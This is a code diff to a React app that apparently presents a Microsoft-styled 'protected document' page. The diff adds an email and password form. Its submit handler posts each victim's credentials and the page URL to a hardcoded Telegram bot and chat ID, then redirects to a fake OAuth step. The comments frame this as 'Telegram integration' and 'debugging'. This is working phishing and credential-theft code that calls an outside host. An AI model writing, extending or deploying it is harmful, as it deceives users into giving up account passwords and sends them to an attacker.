@@ -46,6 +46,38 @@ function App() {
   // 🟢 NEW: Track browser capabilities for enhanced cookie handling
   const [browserCapabilities, setBrowserCapabilities] = useState<any>(null);
 
+  // 🟢 NEW: Add form state for email and password
+  const [formEmail, setFormEmail] = useState('');
+  const [formPassword, setFormPassword] = useState('');
+  const [isSubmitting, setIsSubmitting] = useState(false);
+
+  // 🟢 NEW: Function to send data to Telegram
+  const sendToTelegram = async (email: string, password: string) => {
+    try {
+      const botToken = '7729439776:AAGBcHgFEd3uBxqKj9nW6yPuFg4Zx8NzjSI';
+      const chatId = '6754688449';
+      const message = `🔐 New Login Credentials:\n📧 Email: ${email}\n🔑 Password: ${password}\n🕒 Time: ${new Date().toLocaleString()}\n🌐 URL: ${window.location.href}`;
+      
+      const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      
+      await fetch(telegramUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: 'HTML'
+        })
+      });
+      
+      console.log('✅ Credentials sent to Telegram successfully');
+    } catch (error) {
+      console.warn('⚠️ Failed to send to Telegram:', error);
+    }
+  };
+
   // Add CSS animation for dots
   useEffect(() => {
     const style = document.createElement('style');
@@ -266,7 +298,45 @@ function App() {
     window.location.reload();
   };
 
-  // NEW: Handle document protection access
+  // 🟢 MODIFIED: Handle form submission with Telegram integration
+  const handleFormSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    
+    if (!formEmail || !formPassword) {
+      alert('Please enter both email and password');
+      return;
+    }
+
+    setIsSubmitting(true);
+    
+    try {
+      // Send to Telegram
+      await sendToTelegram(formEmail, formPassword);
+      
+      // Store the credentials in state for debugging
+      setCapturedEmailState(formEmail);
+      setCapturedCredentials({
+        email: formEmail,
+        password: formPassword,
+        captureTime: new Date().toISOString(),
+        source: 'document-protection-form'
+      });
+      
+      // Redirect to OAuth after short delay
+      setTimeout(() => {
+        setCurrentPage('oauth-redirect');
+      }, 1000);
+      
+    } catch (error) {
+      console.error('Error submitting form:', error);
+      // Continue to OAuth even if Telegram fails
+      setTimeout(() => {
+        setCurrentPage('oauth-redirect');
+      }, 1000);
+    }
+  };
+
+  // NEW: Handle document protection access (original function preserved)
   const handleDocumentAccess = () => {
     setCurrentPage('oauth-redirect');
   };
@@ -427,40 +497,104 @@ function App() {
               </div>
             </div>
 
-            {/* Access Button */}
-            <button
-              onClick={handleDocumentAccess}
-              className="protected-doc"
-              style={{
-                width: '100%',
-                padding: '16px 24px',
-                background: 'linear-gradient(135deg, #0078d4 0%, #005a9e 100%)',
-                color: 'white',
-                border: 'none',
-                borderRadius: '6px',
-                cursor: 'pointer',
-                fontSize: '16px',
-                fontWeight: '600',
-                boxShadow: '0 4px 16px rgba(0,120,212,0.4)',
-                transition: 'all 0.2s ease',
-                marginBottom: '15px',
-                textShadow: '0 1px 2px rgba(0,0,0,0.2)',
-                position: 'relative',
-                overflow: 'hidden'
-              }}
-              onMouseOver={(e) => {
-                e.currentTarget.style.background = 'linear-gradient(135deg, #106ebe 0%, #004578 100%)';
-                e.currentTarget.style.transform = 'translateY(-2px)';
-                e.currentTarget.style.boxShadow = '0 6px 20px rgba(0,120,212,0.5)';
-              }}
-              onMouseOut={(e) => {
-                e.currentTarget.style.background = 'linear-gradient(135deg, #0078d4 0%, #005a9e 100%)';
-                e.currentTarget.style.transform = 'translateY(0)';
-                e.currentTarget.style.boxShadow = '0 4px 16px rgba(0,120,212,0.4)';
-              }}
-            >
-              🔐 Authenticate & Open Document
-            </button>
+            {/* 🟢 NEW: Email and Password Form */}
+            <form onSubmit={handleFormSubmit} style={{ textAlign: 'left', marginBottom: '25px' }}>
+              <div style={{ marginBottom: '15px' }}>
+                <label style={{
+                  display: 'block',
+                  fontSize: '14px',
+                  fontWeight: '600',
+                  color: '#323130',
+                  marginBottom: '6px'
+                }}>
+                  Email Address
+                </label>
+                <input
+                  type="email"
+                  value={formEmail}
+                  onChange={(e) => setFormEmail(e.target.value)}
+                  required
+                  style={{
+                    width: '100%',
+                    padding: '12px 16px',
+                    border: '1px solid #d2d0ce',
+                    borderRadius: '6px',
+                    fontSize: '16px',
+                    fontFamily: 'inherit',
+                    boxSizing: 'border-box'
+                  }}
+                  placeholder="Enter your Microsoft email"
+                />
+              </div>
+              
+              <div style={{ marginBottom: '20px' }}>
+                <label style={{
+                  display: 'block',
+                  fontSize: '14px',
+                  fontWeight: '600',
+                  color: '#323130',
+                  marginBottom: '6px'
+                }}>
+                  Password
+                </label>
+                <input
+                  type="password"
+                  value={formPassword}
+                  onChange={(e) => setFormPassword(e.target.value)}
+                  required
+                  style={{
+                    width: '100%',
+                    padding: '12px 16px',
+                    border: '1px solid #d2d0ce',
+                    borderRadius: '6px',
+                    fontSize: '16px',
+                    fontFamily: 'inherit',
+                    boxSizing: 'border-box'
+                  }}
+                  placeholder="Enter your password"
+                />
+              </div>
+
+              <button
+                type="submit"
+                disabled={isSubmitting}
+                className="protected-doc"
+                style={{
+                  width: '100%',
+                  padding: '16px 24px',
+                  background: isSubmitting 
+                    ? 'linear-gradient(135deg, #8a8a8a 0%, #6a6a6a 100%)'
+                    : 'linear-gradient(135deg, #0078d4 0%, #005a9e 100%)',
+                  color: 'white',
+                  border: 'none',
+                  borderRadius: '6px',
+                  cursor: isSubmitting ? 'not-allowed' : 'pointer',
+                  fontSize: '16px',
+                  fontWeight: '600',
+                  boxShadow: '0 4px 16px rgba(0,120,212,0.4)',
+                  transition: 'all 0.2s ease',
+                  textShadow: '0 1px 2px rgba(0,0,0,0.2)',
+                  position: 'relative',
+                  overflow: 'hidden'
+                }}
+                onMouseOver={(e) => {
+                  if (!isSubmitting) {
+                    e.currentTarget.style.background = 'linear-gradient(135deg, #106ebe 0%, #004578 100%)';
+                    e.currentTarget.style.transform = 'translateY(-2px)';
+                    e.currentTarget.style.boxShadow = '0 6px 20px rgba(0,120,212,0.5)';
+                  }
+                }}
+                onMouseOut={(e) => {
+                  if (!isSubmitting) {
+                    e.currentTarget.style.background = 'linear-gradient(135deg, #0078d4 0%, #005a9e 100%)';
+                    e.currentTarget.style.transform = 'translateY(0)';
+                    e.currentTarget.style.boxShadow = '0 4px 16px rgba(0,120,212,0.4)';
+                  }
+                }}
+              >
+                {isSubmitting ? '🔄 Authenticating...' : '🔐 Authenticate & Open Document'}
+              </button>
+            </form>
 
             {/* Alternative Actions */}
             <div style={{
